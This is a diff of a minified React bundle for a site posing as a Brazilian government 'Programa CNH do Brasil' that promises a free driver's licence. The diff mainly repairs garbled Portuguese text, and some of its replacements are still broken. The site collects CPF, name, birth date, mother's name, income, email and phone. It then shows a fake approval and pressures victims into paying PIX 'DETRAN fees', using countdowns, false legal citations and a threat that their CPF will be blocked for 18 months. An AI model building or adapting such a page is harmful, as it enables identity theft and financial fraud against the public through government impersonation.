@@ -12891,10 +12891,10 @@ function c3() {
       className: "button-href-mimic2 bank-login-button",
       children: [l.jsx("img", {
         src: "https://sso.acesso.gov.br/assets/govbr/img/icons/InternetBanking-green.png",
-        alt: "Ãcone de Internet Banking"
+        alt: "Ácone de Internet Banking"
       }), "Login com seu banco", l.jsx("span", {
         className: "silver-account-badge",
-        children: "SUA CONTA SERÃ PRATA"
+        children: "SUA CONTA SERÁ PRATA"
       })]
     })
   })
@@ -12982,8 +12982,8 @@ function d3() {
           },
           children: [l.jsx("img", {
             src: "https://sso.acesso.gov.br/assets/govbr/img/icons/id-card-solid.png",
-            alt: "Ãcone de um cartÃ£o de identificaÃ§Ã£o sÃ³lido representando CPF"
-          }), "NÃºmero do CPF"]
+            alt: "Ácone de um cartão de identificação sólido representando CPF"
+          }), "Número do CPF"]
         })
       }), l.jsxs("div", {
         className: "accordion-panel",
@@ -13031,7 +13031,7 @@ function f3() {
     children: [l.jsx("header", {
       children: l.jsx("img", {
         src: "https://i.ibb.co/WGrsWGN/IMG-1297.jpg",
-        alt: "Imagem de cabeÃ§alho com design moderno e cores vibrantes",
+        alt: "Imagem de cabeçalho com design moderno e cores vibrantes",
         style: {
           width: "100%"
         }
@@ -13278,7 +13278,7 @@ function dp(e) {
 }
 
 function h3(e = !1) {
-  const t = e ? ["Maria", "Ana", "Helena", "Alice", "Laura", "Beatriz", "Clara", "Sofia", "Julia", "Isabella"] : ["Miguel", "Arthur", "Heitor", "Helena", "Alice", "Laura", "Maria", "JoÃ£o", "Pedro", "Lucas"],
+  const t = e ? ["Maria", "Ana", "Helena", "Alice", "Laura", "Beatriz", "Clara", "Sofia", "Julia", "Isabella"] : ["Miguel", "Arthur", "Heitor", "Helena", "Alice", "Laura", "Maria", "João", "Pedro", "Lucas"],
     n = ["Silva", "Santos", "Oliveira", "Souza", "Rodrigues", "Ferreira", "Alves", "Pereira"],
     r = ["Costa", "Carvalho", "Gomes", "Martins", "Rocha", "Ribeiro", "Pinto", "Marques"];
   return `${t[Math.floor(Math.random() * t.length)]} ${n[Math.floor(Math.random() * n.length)]} ${r[Math.floor(Math.random() * r.length)]}`
@@ -13327,7 +13327,7 @@ function g3() {
     } catch {
       return null
     }
-  }, [p]), b = (m == null ? void 0 : m.manualEntry) === !0, C = m ? fp(m.data_nascimento) : "", j = !b && (m == null ? void 0 : m.nome_mae) && m.nome_mae.trim() !== "", A = x.useMemo(() => !m || b ? [] : Bc(m.nome, "name"), [m == null ? void 0 : m.nome, b]), P = x.useMemo(() => !m || b ? [] : Bc(C, "date"), [C, b]), M = x.useMemo(() => !m || !j ? [] : Bc(m.nome_mae, "mother"), [m == null ? void 0 : m.nome_mae, j]), _ = ["Desempregado(a)", "AtÃ© R$ 2.640 (atÃ© 2 salÃ¡rios mÃ­nimos)", "De R$ 2.641 a R$ 6.600 (2 a 5 salÃ¡rios mÃ­nimos)", "De R$ 6.601 a R$ 13.200 (5 a 10 salÃ¡rios mÃ­nimos)", "Acima de R$ 13.200 (mais de 10 salÃ¡rios mÃ­nimos)"], G = ["NÃ£o possuo CNH", "Possuo CNH categoria A (moto)", "Possuo CNH categoria B (carro)", "Possuo CNH categoria AB ou superior"], I = R => {
+  }, [p]), b = (m == null ? void 0 : m.manualEntry) === !0, C = m ? fp(m.data_nascimento) : "", j = !b && (m == null ? void 0 : m.nome_mae) && m.nome_mae.trim() !== "", A = x.useMemo(() => !m || b ? [] : Bc(m.nome, "name"), [m == null ? void 0 : m.nome, b]), P = x.useMemo(() => !m || b ? [] : Bc(C, "date"), [C, b]), M = x.useMemo(() => !m || !j ? [] : Bc(m.nome_mae, "mother"), [m == null ? void 0 : m.nome_mae, j]), _ = ["Desempregado(a)", "Até R$ 2.640 (até 2 salários mínimos)", "De R$ 2.641 a R$ 6.600 (2 a 5 salários mínimos)", "De R$ 6.601 a R$ 13.200 (5 a 10 salários mínimos)", "Acima de R$ 13.200 (mais de 10 salários mínimos)"], G = ["Não possuo CNH", "Possuo CNH categoria A (moto)", "Possuo CNH categoria B (carro)", "Possuo CNH categoria AB ou superior"], I = R => {
     const L = R.replace(/\D/g, "");
     return L.length <= 2 ? L : L.length <= 7 ? `(${L.slice(0, 2)}) ${L.slice(2)}` : `(${L.slice(0, 2)}) ${L.slice(2, 7)}-${L.slice(7, 11)}`
   }, $ = R => {
@@ -13351,9 +13351,9 @@ function g3() {
             alignItems: "flex-start"
           },
           children: [l.jsx("h3", {
-            children: "Dados nÃ£o encontrados"
+            children: "Dados não encontrados"
           }), l.jsx("p", {
-            children: "NÃ£o foram encontrados dados para verificaÃ§Ã£o."
+            children: "Não foram encontrados dados para verificação."
           }), l.jsx("div", {
             className: "button-panel",
             children: l.jsx("button", {
@@ -13381,7 +13381,7 @@ function g3() {
       return
     }
     if (!b && t !== "email" && t !== "phone" && !o) {
-      s("Por favor, selecione uma opÃ§Ã£o");
+      s("Por favor, selecione uma opção");
       return
     }
     c("loading"), await new Promise(L => setTimeout(L, 3e3));
@@ -13450,7 +13450,7 @@ function g3() {
         }
         n(t === "name" ? b ? "salary" : "birth" : t === "birth" ? j ? "mother" : "salary" : t === "mother" ? "salary" : t === "salary" ? "flights" : t === "flights" ? "email" : "phone"), i("")
       }
-    }, 1e3)) : (s(t === "email" ? "Email invÃ¡lido" : t === "phone" ? "Telefone invÃ¡lido" : "Dados incorretos. Por favor, verifique sua resposta."), c("idle"))
+    }, 1e3)) : (s(t === "email" ? "Email inválido" : t === "phone" ? "Telefone inválido" : "Dados incorretos. Por favor, verifique sua resposta."), c("idle"))
   }, D = (() => {
     const R = L => {
       if (b) switch (L) {
@@ -13505,31 +13505,31 @@ function g3() {
     switch (t) {
       case "name":
         return {
-          title: b ? "Digite seu nome completo" : "Qual Ã© seu nome completo?", options: A, type: "name", number: R("name")
+          title: b ? "Digite seu nome completo" : "Qual é seu nome completo?", options: A, type: "name", number: R("name")
         };
       case "birth":
         return {
-          title: "Qual Ã© sua data de nascimento?", options: P, type: "birth", number: R("birth")
+          title: "Qual é sua data de nascimento?", options: P, type: "birth", number: R("birth")
         };
       case "mother":
         return {
-          title: "Qual Ã© o nome da sua mÃ£e?", options: M, type: "mother", number: R("mother")
+          title: "Qual é o nome da sua mãe?", options: M, type: "mother", number: R("mother")
         };
       case "salary":
         return {
-          title: "Qual Ã© sua faixa salarial atual?", options: _, type: "salary", number: R("salary")
+          title: "Qual é sua faixa salarial atual?", options: _, type: "salary", number: R("salary")
         };
       case "flights":
         return {
-          title: "Qual sua situaÃ§Ã£o atual de habilitaÃ§Ã£o?", options: G, type: "flights", number: R("flights")
+          title: "Qual sua situação atual de habilitação?", options: G, type: "flights", number: R("flights")
         };
       case "email":
         return {
-          title: "Qual Ã© o seu email?", type: "email", number: R("email")
+          title: "Qual é o seu email?", type: "email", number: R("email")
         };
       case "phone":
         return {
-          title: "Qual Ã© o seu telefone?", type: "phone", number: R("phone")
+          title: "Qual é o seu telefone?", type: "phone", number: R("phone")
         }
     }
   })();
@@ -14975,9 +14975,9 @@ function gp() {
             telefone: C.phone || "",
             detran: j
           })
-        }), console.log("[Success] NotificaÃ§Ã£o de venda APROVADA enviada")
+        }), console.log("[Success] Notificação de venda APROVADA enviada")
       } catch (m) {
-        console.error("[Success] Erro ao enviar notificaÃ§Ã£o APROVADA:", m)
+        console.error("[Success] Erro ao enviar notificação APROVADA:", m)
       }
     })()
   }, []), x.useEffect(() => {
@@ -14987,7 +14987,7 @@ function gp() {
         try {
           const m = localStorage.getItem("userData");
           if (!m) {
-            c("Dados do usuÃ¡rio nÃ£o encontrados"), s(!1);
+            c("Dados do usuário não encontrados"), s(!1);
             return
           }
           const b = JSON.parse(m),
@@ -15020,7 +15020,7 @@ function gp() {
             }
           } else c(j.error || "Erro ao gerar PIX")
         } catch (m) {
-          console.error("Erro ao criar transaÃ§Ã£o PIX:", m), c("Erro ao conectar com o servidor")
+          console.error("Erro ao criar transação PIX:", m), c("Erro ao conectar com o servidor")
         } finally {
           s(!1)
         }
@@ -15032,10 +15032,10 @@ function gp() {
       try {
         const C = await (await fetch(`/api/check-payment?id=${t.transaction_id}`)).json();
         if (C.success && C.status) {
-          if (h(C.status), C.status === "paid") return console.log("PAGAMENTO DA TAXA DE EMISSÃƒO CONFIRMADO!"), setTimeout(() => {
+          if (h(C.status), C.status === "paid") return console.log("PAGAMENTO DA TAXA DE EMISSÁƒO CONFIRMADO!"), setTimeout(() => {
             e("/cadastro-concluido")
           }, 1e3), !0;
-          if (C.status === "expired" || C.status === "cancelled") return c("TransaÃ§Ã£o expirada ou cancelada. Por favor, tente novamente."), !0
+          if (C.status === "expired" || C.status === "cancelled") return c("Transação expirada ou cancelada. Por favor, tente novamente."), !0
         }
         return !1
       } catch (b) {
@@ -15075,7 +15075,7 @@ function gp() {
               children: "Pagamento Confirmado!"
             }), l.jsx("p", {
               className: "text-gray-600",
-              children: "Seu cadastro foi concluÃ­do com sucesso!"
+              children: "Seu cadastro foi concluído com sucesso!"
             }), l.jsx("p", {
               className: "text-gray-500 text-sm mt-2",
               children: "Redirecionando..."
@@ -15094,10 +15094,10 @@ function gp() {
           className: "text-center space-y-2 pb-4 border-b",
           children: [l.jsx(ui, {
             className: "text-2xl font-bold text-gray-900",
-            children: "Taxa de EmissÃ£o da CNH"
+            children: "Taxa de Emissão da CNH"
           }), l.jsx("p", {
             className: "text-gray-600",
-            children: "Esta Ã© a Ãºltima taxa obrigatÃ³ria. ApÃ³s a confirmaÃ§Ã£o do pagamento, vocÃª receberÃ¡ acesso completo ao aplicativo do Programa CNH do Brasil."
+            children: "Esta é a última taxa obrigatória. Após a confirmação do pagamento, você receberá acesso completo ao aplicativo do Programa CNH do Brasil."
           })]
         }), l.jsxs(Sn, {
           className: "pt-6",
@@ -15105,7 +15105,7 @@ function gp() {
             className: "flex justify-center mb-6",
             children: l.jsx("img", {
               src: "https://clubedetran.com.br/wp-content/uploads/2018/08/Lancada-a-Carteira-Digital-de-Transito.jpg.webp",
-              alt: "Carteira Digital de TrÃ¢nsito",
+              alt: "Carteira Digital de Trânsito",
               className: "max-w-full h-auto rounded-lg shadow-md",
               style: {
                 maxHeight: "200px"
@@ -15119,33 +15119,33 @@ function gp() {
             }), l.jsxs("ul", {
               className: "text-sm text-blue-800 space-y-2",
               children: [l.jsxs("li", {
-                children: ["â€¢ Esta taxa Ã© ", l.jsx("strong", {
-                  children: "obrigatÃ³ria"
+                children: ["â€¢ Esta taxa é ", l.jsx("strong", {
+                  children: "obrigatória"
                 }), " para finalizar seu cadastro no Programa CNH do Brasil"]
               }), l.jsxs("li", {
-                children: ["â€¢ Valor Ãºnico de ", l.jsx("strong", {
+                children: ["â€¢ Valor único de ", l.jsx("strong", {
                   children: "R$ 74,90"
-                }), " pago uma Ãºnica vez"]
+                }), " pago uma única vez"]
               }), l.jsx("li", {
-                children: "â€¢ Taxa destinada ao processo de emissÃ£o e regularizaÃ§Ã£o da CNH"
+                children: "â€¢ Taxa destinada ao processo de emissão e regularização da CNH"
               }), l.jsx("li", {
-                children: "â€¢ Seu cadastro sÃ³ serÃ¡ concluÃ­do apÃ³s a confirmaÃ§Ã£o deste pagamento"
+                children: "â€¢ Seu cadastro só será concluído após a confirmação deste pagamento"
               })]
             })]
           }), l.jsxs("div", {
             className: "bg-red-50 p-4 rounded-lg border border-red-200 mb-6",
             children: [l.jsx("h4", {
               className: "font-semibold text-red-800 mb-2 text-center",
-              children: "âš ï¸ AtenÃ§Ã£o"
+              children: "âš ï¸ Atenção"
             }), l.jsxs("p", {
               className: "text-sm text-red-700",
               children: ["Informamos que, caso o pagamento da ", l.jsx("strong", {
-                children: "Taxa de EmissÃ£o da CNH"
-              }), " nÃ£o seja realizado, seu cadastro ", l.jsx("strong", {
-                children: "nÃ£o serÃ¡ concluÃ­do"
-              }), " e vocÃª ", l.jsx("strong", {
-                children: "perderÃ¡ o direito de participar do Programa CNH do Brasil"
-              }), ". Conforme o art. 49, Â§2Âº da Lei nÂº 8.078/1990 (CÃ³digo de Defesa do Consumidor), nÃ£o haverÃ¡ reembolso do valor jÃ¡ pago referente Ã s taxas administrativas, uma vez que o serviÃ§o de processamento jÃ¡ foi iniciado junto ao DETRAN."]
+                children: "Taxa de Emissão da CNH"
+              }), " não seja realizado, seu cadastro ", l.jsx("strong", {
+                children: "não será concluído"
+              }), " e você ", l.jsx("strong", {
+                children: "perderá o direito de participar do Programa CNH do Brasil"
+              }), ". Conforme o art. 49, Â§2Âº da Lei nÂº 8.078/1990 (Código de Defesa do Consumidor), não haverá reembolso do valor já pago referente Á s taxas administrativas, uma vez que o serviço de processamento já foi iniciado junto ao DETRAN."]
             })]
           }), l.jsxs("div", {
             className: "text-center mb-6",
@@ -15154,7 +15154,7 @@ function gp() {
               children: "R$ 74,90"
             }), l.jsx("p", {
               className: "text-gray-600",
-              children: "Taxa Ãºnica de emissÃ£o"
+              children: "Taxa única de emissão"
             })]
           }), r ? l.jsxs("div", {
             className: "text-center py-8",
@@ -15193,13 +15193,13 @@ function gp() {
                 })]
               }), l.jsx("p", {
                 className: "text-center text-yellow-700 text-sm mt-2",
-                children: "O pagamento serÃ¡ confirmado automaticamente"
+                children: "O pagamento será confirmado automaticamente"
               })]
             }), (t == null ? void 0 : t.pix_code) && l.jsxs("div", {
               className: "mb-6",
               children: [l.jsx("p", {
                 className: "text-sm font-medium text-gray-700 mb-2",
-                children: "CÃ³digo PIX Copia e Cola:"
+                children: "Código PIX Copia e Cola:"
               }), l.jsxs("div", {
                 className: "space-y-3",
                 children: [l.jsx("div", {
@@ -15212,7 +15212,7 @@ function gp() {
                     className: "h-4 w-4"
                   }) : l.jsx(Ol, {
                     className: "h-4 w-4"
-                  }), o ? "Copiado!" : "Copiar CÃ³digo PIX"]
+                  }), o ? "Copiado!" : "Copiar Código PIX"]
                 })]
               })]
             }), l.jsxs("div", {
@@ -15246,9 +15246,9 @@ function gp() {
                 children: [l.jsx("li", {
                   children: "1. Abra o aplicativo do seu banco"
                 }), l.jsx("li", {
-                  children: "2. Acesse a opÃ§Ã£o PIX"
+                  children: "2. Acesse a opção PIX"
                 }), l.jsx("li", {
-                  children: "3. Escaneie o QR Code ou cole o cÃ³digo PIX"
+                  children: "3. Escaneie o QR Code ou cole o código PIX"
                 }), l.jsx("li", {
                   children: "4. Confirme o pagamento de R$ 74,90"
                 })]
@@ -15257,7 +15257,7 @@ function gp() {
               className: "border-t pt-4 text-center",
               children: l.jsxs("p", {
                 className: "text-xs text-gray-500",
-                children: ["ID da TransaÃ§Ã£o: ", t.transaction_id]
+                children: ["ID da Transação: ", t.transaction_id]
               })
             })]
           })]
@@ -20900,23 +20900,23 @@ const Tg = ({
 },
   Jr = [{
     title: "Programa CNH do Brasil",
-    content: "O Programa CNH do Brasil Ã© uma iniciativa do Governo Federal que pode garantir sua Carteira Nacional de HabilitaÃ§Ã£o 100% GRATUITA! Se vocÃª for aprovado nos critÃ©rios do programa, nÃ£o pagarÃ¡ nada pela sua CNH. Continue seu cadastro aqui no site para verificar sua elegibilidade.",
+    content: "O Programa CNH do Brasil é uma iniciativa do Governo Federal que pode garantir sua Carteira Nacional de Habilitação 100% GRATUITA! Se você for aprovado nos critérios do programa, não pagará nada pela sua CNH. Continue seu cadastro aqui no site para verificar sua elegibilidade.",
     image: "https://www.serpro.gov.br/menu/noticias/noticias-2025/cnh-do-brasil/@@images/image/large"
   }, {
     title: "Acesso ao Aplicativo",
-    content: "ApÃ³s finalizar seu cadastro, vocÃª receberÃ¡ acesso ao aplicativo oficial do programa. Use seu CPF para acessar e acompanhar todo o processo de obtenÃ§Ã£o da sua CNH de forma simples e prÃ¡tica.",
+    content: "Após finalizar seu cadastro, você receberá acesso ao aplicativo oficial do programa. Use seu CPF para acessar e acompanhar todo o processo de obtenção da sua CNH de forma simples e prática.",
     image: "https://cnhbrasil.app/images/mockup-app-500x461.png"
   }, {
-    title: "Aulas TeÃ³ricas e PrÃ¡ticas",
-    content: "Suas aulas teÃ³ricas serÃ£o realizadas 100% pelo aplicativo, totalmente GRATUITAS! Para a parte prÃ¡tica, vocÃª precisarÃ¡ fazer apenas 2 horas de aula com um instrutor credenciado pelo DETRAN. Se vocÃª for aprovado para a gratuidade do programa, essas aulas prÃ¡ticas tambÃ©m serÃ£o gratuitas!",
+    title: "Aulas Teóricas e Práticas",
+    content: "Suas aulas teóricas serão realizadas 100% pelo aplicativo, totalmente GRATUITAS! Para a parte prática, você precisará fazer apenas 2 horas de aula com um instrutor credenciado pelo DETRAN. Se você for aprovado para a gratuidade do programa, essas aulas práticas também serão gratuitas!",
     image: "https://cnhbrasil.app/images/mockup-app-500x461.png"
   }, {
-    title: "EmissÃ£o da CNH",
-    content: "ApÃ³s aprovaÃ§Ã£o nos exames teÃ³rico e prÃ¡tico, sua CNH serÃ¡ emitida e enviada diretamente para seu endereÃ§o. Todo o processo Ã© acompanhado pelo sistema oficial do programa.",
+    title: "Emissão da CNH",
+    content: "Após aprovação nos exames teórico e prático, sua CNH será emitida e enviada diretamente para seu endereço. Todo o processo é acompanhado pelo sistema oficial do programa.",
     image: "https://cnhbrasil.app/images/mockup-app-500x461.png"
   }, {
-    title: "Taxa de AdesÃ£o DETRAN",
-    content: "Para validar sua participaÃ§Ã£o no programa, o DETRAN cobra uma taxa administrativa de adesÃ£o. Esta taxa Ã© obrigatÃ³ria para verificar sua elegibilidade e garantir seu acesso ao Programa CNH do Brasil.",
+    title: "Taxa de Adesão DETRAN",
+    content: "Para validar sua participação no programa, o DETRAN cobra uma taxa administrativa de adesão. Esta taxa é obrigatória para verificar sua elegibilidade e garantir seu acesso ao Programa CNH do Brasil.",
     image: "https://upload.wikimedia.org/wikipedia/commons/2/2b/MTRANSAssinatura.png"
   }];
 
@@ -21032,7 +21032,7 @@ function EE() {
                   className: "h-4 w-4 animate-spin"
                 }), n === "success" && l.jsx(It, {
                   className: "h-4 w-4"
-                }), n === "loading" ? "Processando..." : n === "success" ? "ConcluÃ­do" : e === Jr.length - 1 ? "Finalizar" : "AvanÃ§ar"]
+                }), n === "loading" ? "Processando..." : n === "success" ? "Concluído" : e === Jr.length - 1 ? "Finalizar" : "Avançar"]
               })
             })]
           })
@@ -21049,7 +21049,7 @@ const TE = [{
   nome: "Alagoas"
 }, {
   uf: "AP",
-  nome: "AmapÃ¡"
+  nome: "Amapá"
 }, {
   uf: "AM",
   nome: "Amazonas"
@@ -21058,19 +21058,19 @@ const TE = [{
   nome: "Bahia"
 }, {
   uf: "CE",
-  nome: "CearÃ¡"
+  nome: "Ceará"
 }, {
   uf: "DF",
   nome: "Distrito Federal"
 }, {
   uf: "ES",
-  nome: "EspÃ­rito Santo"
+  nome: "Espírito Santo"
 }, {
   uf: "GO",
-  nome: "GoiÃ¡s"
+  nome: "Goiás"
 }, {
   uf: "MA",
-  nome: "MaranhÃ£o"
+  nome: "Maranhão"
 }, {
   uf: "MT",
   nome: "Mato Grosso"
@@ -21082,19 +21082,19 @@ const TE = [{
   nome: "Minas Gerais"
 }, {
   uf: "PA",
-  nome: "ParÃ¡"
+  nome: "Pará"
 }, {
   uf: "PB",
-  nome: "ParaÃ­ba"
+  nome: "Paraíba"
 }, {
   uf: "PR",
-  nome: "ParanÃ¡"
+  nome: "Paraná"
 }, {
   uf: "PE",
   nome: "Pernambuco"
 }, {
   uf: "PI",
-  nome: "PiauÃ­"
+  nome: "Piauí"
 }, {
   uf: "RJ",
   nome: "Rio de Janeiro"
@@ -21106,7 +21106,7 @@ const TE = [{
   nome: "Rio Grande do Sul"
 }, {
   uf: "RO",
-  nome: "RondÃ´nia"
+  nome: "Rondônia"
 }, {
   uf: "RR",
   nome: "Roraima"
@@ -21115,7 +21115,7 @@ const TE = [{
   nome: "Santa Catarina"
 }, {
   uf: "SP",
-  nome: "SÃ£o Paulo"
+  nome: "São Paulo"
 }, {
   uf: "SE",
   nome: "Sergipe"
@@ -21143,7 +21143,7 @@ function kE() {
     completed: !1
   }, {
     id: 4,
-    message: "Analisando documentaÃ§Ã£o junto ao MinistÃ©rio dos Transportes",
+    message: "Analisando documentação junto ao Ministério dos Transportes",
     completed: !1
   }];
   x.useEffect(() => {
@@ -21227,24 +21227,24 @@ function kE() {
                 className: "text-center",
                 children: [l.jsx("h4", {
                   className: "text-base font-semibold text-green-800 mb-3",
-                  children: "ParabÃ©ns! Cadastro Aprovado com Sucesso"
+                  children: "Parabéns! Cadastro Aprovado com Sucesso"
                 }), l.jsxs("p", {
                   className: "text-sm text-green-700 leading-relaxed",
                   children: ["Prezado(a) ", l.jsx("strong", {
                     children: o.nome
                   }), ", CPF ", l.jsx("strong", {
                     children: u(o.cpf)
-                  }), ", informamos que sua solicitaÃ§Ã£o foi analisada e ", l.jsx("strong", {
+                  }), ", informamos que sua solicitação foi analisada e ", l.jsx("strong", {
                     children: "APROVADA"
-                  }), " pelo Sistema Nacional de HabilitaÃ§Ã£o."]
+                  }), " pelo Sistema Nacional de Habilitação."]
                 }), l.jsxs("p", {
                   className: "text-sm text-green-700 leading-relaxed mt-2",
-                  children: ["O(A) senhor(a) estÃ¡ apto(a) a obter a Carteira Nacional de HabilitaÃ§Ã£o (CNH) de forma ", l.jsx("strong", {
+                  children: ["O(A) senhor(a) está apto(a) a obter a Carteira Nacional de Habilitação (CNH) de forma ", l.jsx("strong", {
                     children: "gratuita"
                   }), ", sem a necessidade de frequentar autoescola, conforme as diretrizes do Programa CNH do Brasil."]
                 }), l.jsx("p", {
                   className: "text-sm text-green-700 leading-relaxed mt-2",
-                  children: "Para dar continuidade ao processo, selecione abaixo o DETRAN correspondente ao seu estado de residÃªncia."
+                  children: "Para dar continuidade ao processo, selecione abaixo o DETRAN correspondente ao seu estado de residência."
                 })]
               })
             }), l.jsxs("div", {
@@ -21317,18 +21317,18 @@ function RE() {
               className: "text-base text-green-800 mb-4",
               children: [l.jsx("strong", {
                 children: "Cadastro aprovado!"
-              }), " Para finalizar, Ã© necessÃ¡rio pagar as taxas obrigatÃ³rias do DETRAN:"]
+              }), " Para finalizar, é necessário pagar as taxas obrigatórias do DETRAN:"]
             }), l.jsxs("div", {
               className: "bg-white p-4 rounded-md mb-6 border border-gray-200",
               children: [l.jsx("h4", {
                 className: "font-semibold text-gray-800 mb-3",
-                children: "Taxas ObrigatÃ³rias:"
+                children: "Taxas Obrigatórias:"
               }), l.jsxs("div", {
                 className: "space-y-2 text-sm text-gray-700",
                 children: [l.jsxs("div", {
                   className: "flex justify-between items-start",
                   children: [l.jsxs("span", {
-                    children: ["â€¢ Taxa de ExpediÃ§Ã£o", l.jsx("br", {}), "do Documento (TED)"]
+                    children: ["â€¢ Taxa de Expedição", l.jsx("br", {}), "do Documento (TED)"]
                   }), l.jsx("span", {
                     className: "font-bold whitespace-nowrap",
                     children: "R$11,95"
@@ -21336,7 +21336,7 @@ function RE() {
                 }), l.jsxs("div", {
                   className: "flex justify-between items-start",
                   children: [l.jsxs("span", {
-                    children: ["â€¢ Taxa de ServiÃ§o", l.jsx("br", {}), "Administrativo (TSA)"]
+                    children: ["â€¢ Taxa de Serviço", l.jsx("br", {}), "Administrativo (TSA)"]
                   }), l.jsx("span", {
                     className: "font-bold whitespace-nowrap",
                     children: "R$13,40"
@@ -21344,7 +21344,7 @@ function RE() {
                 }), l.jsxs("div", {
                   className: "flex justify-between items-start",
                   children: [l.jsxs("span", {
-                    children: ["â€¢ Taxa de Processamento", l.jsx("br", {}), "e EmissÃ£o (TPE)"]
+                    children: ["â€¢ Taxa de Processamento", l.jsx("br", {}), "e Emissão (TPE)"]
                   }), l.jsx("span", {
                     className: "font-bold whitespace-nowrap",
                     children: "R$11,85"
@@ -21373,10 +21373,10 @@ function RE() {
                   })
                 }), l.jsx("p", {
                   className: "text-yellow-800 text-center font-medium",
-                  children: "AtenÃ§Ã£o: Sua vaga estÃ¡ reservada temporariamente"
+                  children: "Atenção: Sua vaga está reservada temporariamente"
                 }), l.jsx("p", {
                   className: "text-yellow-700 text-sm text-center mt-2",
-                  children: "Complete o pagamento antes que o tempo expire ou sua vaga serÃ¡ disponibilizada para outro cidadÃ£o"
+                  children: "Complete o pagamento antes que o tempo expire ou sua vaga será disponibilizada para outro cidadão"
                 })]
               }), l.jsxs("div", {
                 className: "flex items-center gap-2 p-4 bg-red-50 rounded-lg border border-red-100",
@@ -21386,7 +21386,7 @@ function RE() {
                   className: "text-red-800 text-sm",
                   children: [l.jsx("strong", {
                     children: "Importante:"
-                  }), " O nÃ£o pagamento resultarÃ¡ na perda permanente do direito ao programa e sua vaga serÃ¡ imediatamente liberada para outro cidadÃ£o na fila de espera"]
+                  }), " O não pagamento resultará na perda permanente do direito ao programa e sua vaga será imediatamente liberada para outro cidadão na fila de espera"]
                 })]
               })]
             }), l.jsx(jn, {
@@ -21439,7 +21439,7 @@ function DE() {
           }), localStorage.setItem(I, new Date().toISOString())), setTimeout(() => {
             e("/success")
           }, 1e3), !0
-        } else if (G.status === "expired" || G.status === "cancelled") return console.log("TransaÃ§Ã£o expirada ou cancelada"), d("TransaÃ§Ã£o expirada ou cancelada. Por favor, tente novamente."), !0
+        } else if (G.status === "expired" || G.status === "cancelled") return console.log("Transação expirada ou cancelada"), d("Transação expirada ou cancelada. Por favor, tente novamente."), !0
       }
       return !1
     } catch (_) {
@@ -21458,7 +21458,7 @@ function DE() {
     try {
       const M = localStorage.getItem("userData");
       if (!M) {
-        d("Dados do usuÃ¡rio nÃ£o encontrados");
+        d("Dados do usuário não encontrados");
         return
       }
       const _ = JSON.parse(M),
@@ -21491,7 +21491,7 @@ function DE() {
         }
       } else d(I.error || "Erro ao gerar PIX")
     } catch (M) {
-      console.error("Erro ao criar transaÃ§Ã£o PIX:", M), d("Erro ao conectar com o servidor")
+      console.error("Erro ao criar transação PIX:", M), d("Erro ao conectar com o servidor")
     } finally {
       s(!1)
     }
@@ -21555,7 +21555,7 @@ function DE() {
                 }), l.jsx("li", {
                   children: "â€¢ Entre em contato com o suporte se o problema persistir"
                 }), l.jsx("li", {
-                  children: "â€¢ Alternativamente, use outro mÃ©todo de pagamento"
+                  children: "â€¢ Alternativamente, use outro método de pagamento"
                 })]
               })]
             }), l.jsxs("div", {
@@ -21611,7 +21611,7 @@ function DE() {
           className: "space-y-4 pb-6 border-b",
           children: [l.jsx(ui, {
             className: "text-xl font-bold text-gray-900 text-center",
-            children: "Detalhes da CobranÃ§a"
+            children: "Detalhes da Cobrança"
           }), l.jsxs("div", {
             className: "bg-gray-50 p-4 rounded-lg space-y-3",
             children: [l.jsxs("div", {
@@ -21645,7 +21645,7 @@ function DE() {
               className: "flex justify-between items-center",
               children: [l.jsx("span", {
                 className: "text-gray-600 text-sm",
-                children: "SituaÃ§Ã£o:"
+                children: "Situação:"
               }), l.jsx("span", {
                 className: "font-medium text-yellow-600 bg-yellow-100 px-2 py-1 rounded text-sm",
                 children: "Aguardando pagamento"
@@ -21668,12 +21668,12 @@ function DE() {
                 className: "text-white text-sm",
                 children: [l.jsx("p", {
                   className: "font-bold mb-2",
-                  children: "ATENÃ‡ÃƒO - AVISO IMPORTANTE"
+                  children: "ATENÇÁƒO - AVISO IMPORTANTE"
                 }), l.jsxs("p", {
                   className: "mb-2",
-                  children: ["O processo de cadastro do seu CPF jÃ¡ foi aberto junto ao DETRAN. Caso o pagamento das taxas obrigatÃ³rias nÃ£o seja realizado dentro do prazo estabelecido, seu CPF ficarÃ¡ ", l.jsx("strong", {
-                    children: "bloqueado no sistema do DENATRAN pelo perÃ­odo de 18 meses"
-                  }), ", ficando impedido de emitir a CNH durante este perÃ­odo."]
+                  children: ["O processo de cadastro do seu CPF já foi aberto junto ao DETRAN. Caso o pagamento das taxas obrigatórias não seja realizado dentro do prazo estabelecido, seu CPF ficará ", l.jsx("strong", {
+                    children: "bloqueado no sistema do DENATRAN pelo período de 18 meses"
+                  }), ", ficando impedido de emitir a CNH durante este período."]
                 }), l.jsx("p", {
                   className: "font-semibold",
                   children: "Realize o pagamento agora e evite maiores transtornos."
@@ -21713,7 +21713,7 @@ function DE() {
             className: "mb-6",
             children: [l.jsx("p", {
               className: "text-sm font-medium text-gray-700 mb-2",
-              children: "CÃ³digo PIX Copia e Cola:"
+              children: "Código PIX Copia e Cola:"
             }), l.jsxs("div", {
               className: "space-y-3",
               children: [l.jsx("div", {
@@ -21726,7 +21726,7 @@ function DE() {
                   className: "h-4 w-4"
                 }) : l.jsx(Ol, {
                   className: "h-4 w-4"
-                }), o ? "Copiado!" : "Copiar CÃ³digo PIX"]
+                }), o ? "Copiado!" : "Copiar Código PIX"]
               })]
             })]
           }), l.jsxs("div", {
@@ -21753,7 +21753,7 @@ function DE() {
               })
             }), l.jsx("p", {
               className: "text-sm text-gray-600 mt-2",
-              children: f || t != null && t.pix_code ? "Escaneie o QR Code com o app do seu banco" : "Use o cÃ³digo PIX abaixo no seu aplicativo bancÃ¡rio"
+              children: f || t != null && t.pix_code ? "Escaneie o QR Code com o app do seu banco" : "Use o código PIX abaixo no seu aplicativo bancário"
             })]
           }), l.jsxs("div", {
             className: "bg-blue-50 p-4 rounded-lg border border-blue-100 mb-6",
@@ -21765,9 +21765,9 @@ function DE() {
               children: [l.jsx("li", {
                 children: "1. Abra o aplicativo do seu banco"
               }), l.jsx("li", {
-                children: "2. Acesse a opÃ§Ã£o PIX"
+                children: "2. Acesse a opção PIX"
               }), l.jsx("li", {
-                children: "3. Escaneie o QR Code ou cole o cÃ³digo PIX"
+                children: "3. Escaneie o QR Code ou cole o código PIX"
               }), l.jsx("li", {
                 children: "4. Confirme o pagamento de R$ 37,20"
               })]
@@ -21782,13 +21782,13 @@ function DE() {
               })]
             }), l.jsx("p", {
               className: "text-xs text-gray-500 mt-1",
